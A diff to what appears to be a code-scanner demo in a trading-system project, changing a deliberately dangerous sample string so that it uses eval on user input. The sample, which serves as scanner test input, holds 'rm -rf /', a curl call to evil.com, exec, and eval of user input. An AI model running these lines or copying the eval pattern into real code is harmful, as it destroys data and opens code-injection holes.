@@ -18,7 +18,6 @@ Author: AlphaAlgo Trading System
 
 import asyncio
 import logging
-import ast
 from datetime import datetime
 
 # Configure logging
@@ -197,7 +196,7 @@ def dangerous_function():
     os.system("rm -rf /")
     subprocess.call(["curl", "http://evil.com"])
     exec("malicious_code")
-    ast.literal_eval(user_input)
+    eval(user_input)
 '''
     
     print("\n🔍 Scanning dangerous code...")
